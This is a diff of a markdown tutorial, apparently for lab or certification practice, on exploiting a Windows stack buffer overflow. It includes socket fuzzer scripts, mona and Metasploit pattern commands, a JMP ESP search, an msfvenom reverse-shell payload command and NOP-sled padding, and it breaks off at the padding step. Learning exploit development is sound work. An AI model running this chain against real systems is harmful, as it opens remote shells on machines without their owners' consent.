@@ -93,7 +93,7 @@ Launch Immunity Debugger, then "Open" or "Attach" the .exe file.
 
 ### Mona configuration 
 
-All mona commands must be run in the terminal inside Immunity Debugger (in the red rectangle).
+All mona commands must be run in the **terminal** inside Immunity Debugger (in the red rectangle).
 
 ![Mona commands](/assets/imgs/buffer_overflow/mona_commands.PNG)
 
@@ -112,8 +112,8 @@ Use fuzzer.py or fuzzer2.py, until the application crash inside Immunity Debugge
 
 import socket, time, sys
 
-ip = "<IP>"
-port = <PORT>
+IP = "<IP>"
+PORT = <PORT>
 timeout = 5
 
 buffer = []
@@ -126,14 +126,14 @@ for string in buffer:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(timeout)
-        connect = s.connect((ip, port))
+        connect = s.connect((IP, PORT))
         s.recv(1024)
         print("Fuzzing with %s bytes" % len(string))
         s.send(string)
         s.recv(1024)
         s.close()
     except:
-        print("Could not connect to " + ip + ":" + str(port))
+        print("Could not connect to " + IP + ":" + str(PORT))
         sys.exit(0)
     time.sleep(1)
 ```
@@ -143,21 +143,26 @@ for string in buffer:
 
 import socket
 
-target_ip = "<IP>"
-target_port = <PORT>
+IP = "<IP>"
+PORT = <PORT>
 
 payload = 1000 * "A"
 
 try: 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((target_ip,target_port))
+    s.connect((IP,PORT))
     s.send(payload)
     print "[+] " + str(len(payload)) + " Bytes Sent"
 except:
     print "[-] Crashed"
 ```
 
-When the application crashes, EIP should be equal to 41414141 (hex value of "AAAA").
+You just have to modify those two variables of the scripts above :
+
+- IP
+- PORT
+
+When the application crashes, EIP should be equal to **41414141** (hex value of "AAAA").
 
 ------
 
@@ -175,7 +180,7 @@ Generate a cyclic pattern to found the exact offset of the crash :
 /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <SIZE>
 ```
 
-The size must be higher than the crash offset. Now modify the "payload" variable by the cyclic pattern :
+The size must be **higher** than the crash offset. Now modify the **payload** variable by the cyclic pattern :
 
 ```
 # exploit.py
@@ -212,7 +217,7 @@ Re-run the exploit, the application should crash. To find the exact offset of th
 !mona findmsp -distance <SIZE>
 ```
 
-Size is the same as the one used to create the pattern. The result should be something like :
+Size is the **same** as the one used to create the pattern. The result should be something like :
 
 ```
 EIP contains normal pattern : ... (offset XXXX)
@@ -220,9 +225,9 @@ EIP contains normal pattern : ... (offset XXXX)
 
 Get the offset, modify in exploit.py:
 
-- The "offset" variable by the offset
-- The "retn" variable by "BBBB"
-- Remove the "payload" variable
+- The **offset** variable by the offset
+- The **retn** variable by "BBBB"
+- Remove the **payload** variable
 
 ```
 offset = <OFFSET>
@@ -231,13 +236,13 @@ retn = "BBBB"
 payload = ""
 ```
 
-Re-run exploit.py, EIP should be equal to 42424242 (hex value of "BBBB"). You know control EIP !
+Re-run exploit.py, EIP should be equal to **42424242** (hex value of "BBBB"). You now control EIP !
 
 ------
 
 ### Finding bad characters
 
-Certain byte characters can cause issues in the development of exploits. We must run every byte through the program to see if any characters cause issues. By default, the null byte (x00) is always considered a bad character as it will truncate shellcode when executed.
+Certain byte characters can cause issues in the development of exploits. We must run every byte through the program to see if any characters cause issues. By default, the null byte (**\x00**) is always considered a bad character as it will truncate shellcode when executed.
 
 We will send bad characters recursively and analyze if they need to be removed. Let generate the list of bad characters with mona :
 
@@ -245,13 +250,13 @@ We will send bad characters recursively and analyze if they need to be removed. 
 !mona bytearray -b "\x00"
 ```
 
-Copy the results in the variable "payload". And re-run exploit.py, the application should crash. Now to found those bad characters use this command :
+Copy the results in the variable **payload**. And re-run exploit.py, the application should crash. Now to found those bad characters use this command :
 
 ```
 !mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
 ```
 
-If "BadChars" are found, we need to exclude them as well.
+If **BadChars** are found, we need to exclude them as well.
 
 ```
 !mona bytearray -b "\x00 + <BAD_CHARS>"
@@ -266,7 +271,7 @@ Then compare again :
 !mona compare -f C:\mona\<PATH>\bytearray.bin -a <ESP_ADDRESS>
 ```
 
-Repeat those two steps until the results status returns "Unmodified", this indicates that no more bad characters exist.
+Repeat those two steps until the results status returns **Unmodified**, this indicates that no more bad characters exist.
 
 ------
 
@@ -284,7 +289,7 @@ Repeat those two steps until the results status returns "Unmodified", this indic
 !mona modules
 ```
 
-We need to found a .dll were Rebase, SafeSEH, ASLR, NXCompat are sets to False. When you found it, run the command below to search for a JMP ESP (FFE4), inside the dll :
+We need to found a .dll were Rebase, SafeSEH, ASLR, NXCompat are sets to False. When you found it, run the command below to search for a **JMP ESP** (FFE4), inside the dll :
 
 ```
 !mona find -s "\xff\xe4" -m <DLL>
@@ -294,7 +299,7 @@ We need to found a .dll were Rebase, SafeSEH, ASLR, NXCompat are sets to False. 
 
 Choose an address in the results and update exploit.py :
 
-- Setting the "retn" variable to the address, written backwards
+- Setting the **retn** variable to the address, written backwards (little-endian)
 
 ```
 # Example of a JMP ESP address
@@ -308,7 +313,7 @@ retn = "\xaf\x11\x50\x62"
 
 ### Generate payload 
 
-Now we generate our shellcode without the badchars that we found :
+Now we generate our shellcode **without** the badchars that we found :
 
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -f c
@@ -316,13 +321,13 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -b "<BAD_CHARS>" -
 
 Copy the generated shellcode and update exploit.py :
 
-- Setting the "payload" variable equal to the shellcode
+- Setting the **payload** variable equal to the shellcode
 
 ------
 
 ### Prepend NOPs 
 
-A NOP-sled is a technique for exploiting stack buffer overflows. It solves the problem of finding the exact address of the buffer by effectively increasing the size of the target area, \x90 represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.
+A NOP-sled is a technique for exploiting stack buffer overflows. It solves the problem of finding the exact address of the buffer by effectively increasing the size of the target area, **\x90** represents a NOP in assembly. This instruction will literally do nothing and continue on with code execution.
 
 ```
 padding = "\x90" * 16
